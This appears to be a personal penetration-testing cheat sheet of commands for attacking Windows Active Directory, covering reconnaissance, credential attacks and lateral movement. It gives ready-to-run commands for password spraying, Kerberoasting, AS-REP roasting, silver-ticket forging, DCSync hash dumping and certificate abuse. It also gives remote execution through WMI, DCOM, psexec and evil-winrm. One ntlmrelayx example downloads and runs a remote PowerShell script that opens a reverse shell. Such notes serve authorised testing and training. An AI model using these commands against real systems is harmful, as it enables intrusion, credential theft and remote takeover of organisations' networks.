# Reconnaissance
### PowerView
#windows 
-  https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
- <mark>Basic Information</mark>
```shell
# Basic information about the domain
Get-NetDomain
# Domain Policies
Get-DomainPolicy
# Enumerate user objects
Get-NetUser
Get-NetUser [User_Name]
Get-NetUser | select cn,pwdlastset,lastlogon
# Enumerate group objects
Get-NetGroup
Get-NetGroup [Group_Name]
Get-NetGroup | select cn
# Enumerate computer objects
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
#  Enumerate Locally
Get-NetLocalGroup
Get-NetLocalGroupMember
```
- <mark>Permissions & Logged on Users</mark>
	-  The command relies on the `OpenServiceW` function, which will connect to the _Service Control Manager_ (SCM) on the target machines. PowerView will attempt to open this database with the _SC_MANAGER_ALL_ACCESS_ access right, which require administrative privileges, and if the connection is successful, PowerView will deem that our current user has administrative privileges on the target machine.
	```shell
	# Find local administrative access on computers under the current user context or specified otherwise.
	Find-LocalAdminAccess
	```
	- Uses the _NetWkstaUserEnum_ and _NetSessionEnum_  Windows APIs under the hood.
	- The permissions required to enumerate sessions with _NetSessionEnum_ are defined in the **SrvsvcSessionInfo** registry key at `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity`.
	```shell
	Get-NetSession -Verbose -ComputerName [Computer_Name] 
	```
- <mark>Service Principal Name</mark>
	```shell
	Get-NetUser -SPN | select samaccountname,serviceprincipalname
	```
- <mark>Object Permissions</mark>
	-  An object in AD may have a set of permissions applied to it with multiple Access Control Entries (ACE).These ACEs make up the Access Control List (ACL).
	1. GenericAll: Full permissions on object
	2. GenericWrite: Edit certain attributes on the object
	3. WriteOwner: Change ownership of the object
	4. WriteDACL: Edit ACE's applied to object
	5. AllExtendedRights: Change password, reset password, etc.
	6. ForceChangePassword: Password change for object
	7. Self (Self-Membership): Add ourselves to for example a group
	```shell
	Get-ObjectAcl -Identity stephanie
	Convert-SidToName [SID]
	Get-ObjectAcl -Identity "stephanie" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
	```
- <mark>Domain Shares</mark>
	- `SYSVOL` which resides on the domain controller itself. This particular share is typically used for various domain policies and scripts. 
	- By default, the `SYSVOL` share is mapped to `%SystemRoot%\SYSVOL\Sysvol\domain-name` on the domain controller and every domain user has access to it.
	```shell
	Find-DomainShare
	# Display shares only available to user's querying
	Find-DomainShare -CheckShareAccess
	```
	- <mark>Kerberos-Related</mark>
	```shell
	Get-DomainUser -PreauthNotRequired
	```
### SharpHound
#windows 
- SharpHound.ps1
	- For enumeration with new user, it is important that, not only LDAP queries, but also `SharpHound` is ran under the new user's security context.
	- To obtain a new session, use
```shell
# General but complex
`New Process:` Start-Process -FilePath "powershell.exe" -ArgumentList "[Arguments]" -Credential (New-Object System.Management.Automation.PSCredential ('[Domain]\[Username]', (ConvertTo-SecureString '[Password]' -AsPlainText -Force))) -NoNewWindow
# Requires special conditions but easy
1. `runas` if GUI access is allowed 
```

```shell
# Loac SharpHound.ps1
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force
# Load Script and Query using current session user context
. .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -OutputDirectory [Output_Path] 
# Run LDAP Query using specified user context
# Be careful, this is LDAP query only, bloodhound still runs within the session user's context
Invoke-BloodHound -CollectionMethod All -OutputDirectory [Output_Path] -ldapusername [Username] -ldappassword [Password]
```
### netexec
- `PtH`: `-H`
- <mark>Login Brute-Forcing</mark>
```bash
# `-d` to specify domain
# `-H` to specify NTLM hash
netexec [PROTOCOL] [TARGET] -u [USER_FILE] -p [PASSWORD_FILE] --continue-on-success
```
- <mark>SMB-Related</mark>
```bash
#List Shares and permissions
netexec smb [TARGET] -u [USERNAME] -p [PASSWORD] --shares
#Spider Shares
netexec smb [TARGET] -u [USERNAME] -p [PASSWORD] -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=[PATH] 
```
- <mark>LDAP-Related</mark>
```bash
#Remember to add FQDN of DC to "/etc/host"
netexec ldap [DC_IP] -u [USERNAME] -p [PASSWORD] -M adcs
#Invoke Bloodhound
netexec ldap [DC_IP] -u [USERNAME] -p [PASSWORD] -ns [DC_IP] --bloodhound -c all
```
### ldapdomaindump
#linux 
```shell
ldapdomaindump --no-json --no-grep ldap://[DC_IP] -u "[Domain]\[Username]" -p [Password] 
```
### Responder
#linux 
```shell
# Starts responder in analysis mode without poisoning.
responder -I [NIC_Name] -A
```

# Authentication Attacks
### Kerbrute
```shell
# Password Spray
kerbrute passwordspray -d [Domain] [Username or File] "[Password]"
```
### impacket-suite
#linux 
#### GetNPUsers
- `Pth`: `--hashes`
```shell
# If a valid domain credential is known
# Retrieve all AS-REP roastable hashes
# Hashcat -m 18200
impacket-GetNPUsers -dc-ip [IP] [FQDN]/[Username]:[Password] -request -outputfile [Output_Path]

# If a list of users is known
impacket-GetNPUsers -dc-ip [IP] -no-pass -usersfile [Path] [FQDN]/
```
#### GetUserSPNs
- `Pth`: `--hashes`
```shell
# If a valid domain credential is known
# Retrieve all Kerberoastable SPNs hashes
# Hashcat -m 13100
impacket-GetUserSPNs -dc-ip [IP] [FQDN]/[Username]:[Password] -request -outputfile [Output_Path] 
```
#### ticketer
```shell
# Forging Silver Tickets
impacket-ticketer -nthash [Hash] -domain-sid [Domain_SID] -spn [SPN] -domain [FQDN] [Username]
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache 
```
#### secretsdump
- `Pth`: `--hashes`
```shell
# DC-Sync Attack
impacket-secretsdump [Domain]/[Username]:"[Password]"@[DC_IP]

# Against specific user
impacket-secretsdump -just-dc-user [Username] [Domain]/[Username]:"[Password]"@[DC_IP]

# Dump Hashes from SAM database file
impacket-secretsdump -sam SAM -system SYSTEM LOCAL 
```
### SharpCollection
#windows 
#### Rubeus
```shell
# Get NTLM Hash of the user
Rubeus.exe asktgt /user:[Username] /certificate:[Cert_Name].pfx /getcredentials /show /nowrap
```
### AD Certificate Services
#linux 
#### certipy-ad
- https://github.com/ly4k/Certipy?tab=readme-ov-file
- The following commands assume `CA` locates on `DC`. Otherwise, one needs to add `-target` option to the command.
```shell
# Find Vulnerable Certificate Template
certipy-ad find -dc-ip [DC_IP] -target [CA_IP] -u [Username]@[Domain] -p [Password] -stdout -vulnerable  
# Request certificate
# where `-ca` should be identified during above command
certipy-ad req -u [Username]@[Domain] -p [Password] --dc-ip [DC_IP] -target [CA_IP] -upn [Username]@[Domain] -ca [CN] -template [Template_Name]
# Request TGT using certificate
certipy-ad auth -pfx [Cert_Name].pfx
```
# Lateral Movement
### WMI
- To create a process on the remote target via WMI, we need the credentials of a member of the _Administrators_ local group.
- WMI communicates through `Remote Procedure Calls(RPC)` over port 135 for remote access and uses a higher-range port (19152-65535) for session data.
```shell
# CMD
wmic /node:"[IP]" /user:"[Username]" /password:"[Password]" process call create "powershell.exe -nop -w hidden -c ...."
# Powershell Common Interface Model(CIM)
Invoke-CimMethod -CimSession (New-CimSession -ComputerName [IP] -Credential (New-Object System.Management.Automation.PSCredential ('[Username]', (ConvertTo-SecureString '[Password]' -AsPlainText -Force))) -SessionOption (New-CimSessionOption -Protocol DCOM)) -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='[Command]'};
```
### WinRM
- Built-in Commands:
	1. download
	2. upload
	3. services
	4. Menu
```shell
evil-winrm -i [IP] -u [USER] [-p PASS]/[-H HASH]
```
### PS Remoting
```shell
New-PSSession -ComputerName [IP] -Credential (New-Object System.Management.Automation.PSCredential ('[Username]', (ConvertTo-SecureString '[Password]' -AsPlainText -Force)))\
# List active session
Get-PSSession
# Interact with chosen session
Enter-PSSession [Session_ID]
```
### impacket-suite
#### ntlmrelayx
```bash
# where `CMD` can be "powershell.exe -c iex(iwr http://[IP]:[Port]/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [Port]"
impacket-ntlmrelayx --no-http-server -smb2support -t [target_IP] -c [CMD]
```
#### psexec
```bash
# Password
impacket-psexec [Domain]/[Username]:[Password]@[IP Address] powershell.exe
# NTLM Hash
impacket-psexec -hashes :[NLTM_Hash] [Domain]/[Username]@[IP Address] powershell.exe
# download from share `ADMIN$`
move/copy [File_Path] \\[Computer_Name]\ADMIN$
lget
# Upload to share `ADMIN$`
lput
```
#### wmiexec
-  A similar approach to `psexec` but executing commands through WMI.
- `Advantage`: runs under the user (has to be Admin) account, not SYSTEM, and does not generate noisy messages in the event log that smbexec.py does when creating a service.
- `Drawback`: needs DCOM, hence, I have to be able to access DCOM ports at the target machine.
```bash
# Password
impacket-wmiexec [Domain]/[Username]:[Password]@[IP Address] powershell.exe
# NTLM Hash
impacket-wmiexec -hashes :[NLTM_Hash] [Domain]/[Username]@[IP Address] powershell.exe
```
### DCOM
```shell
[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","[IP]")).Document.ActiveView.ExecuteShellCommand("powershell.exe",$null,"-nop -w hidden -c ...","7")
```